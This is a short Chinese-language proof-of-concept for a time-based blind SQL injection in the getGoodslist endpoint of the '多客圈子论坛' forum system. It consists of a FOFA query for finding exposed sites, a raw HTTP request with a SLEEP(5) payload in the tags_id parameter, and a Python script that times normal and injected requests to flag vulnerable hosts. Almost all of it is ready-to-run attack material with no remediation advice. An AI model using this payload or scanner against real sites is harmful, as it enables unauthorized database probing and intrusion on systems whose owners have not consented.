# 多客圈子论坛系统 getGoodslist 存在SQL注入

# fofa: body="/static/index/js/jweixin-1.2.0.js"||body="多客官方"||body="多客圈子论坛"

#poc
"""GET /api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%285%29%29%29xCMp%29--+OGeQ HTTP/1.1
Host: [目标主机]
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36
Accept: */*
Connection: close"""

#脚本
import requests
url=""          #目标url
payload = "/api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%285%29%29%29xCMp%29--+OGeQ"
# 正常发送一个请求
res1 = requests.get(url=url)
print(res1.status_code)
# 带有payload的请求
res2 = requests.get(url=url+payload)
print(res1.elapsed.total_seconds(),res2.elapsed.total_seconds())
print(res2.elapsed.total_seconds() - res1.elapsed.total_seconds())

if res2.elapsed.total_seconds() - res1.elapsed.total_seconds() <=5 and res2.elapsed.total_seconds() >=5:
    print(f"[+]{url}存在延时sql注入")
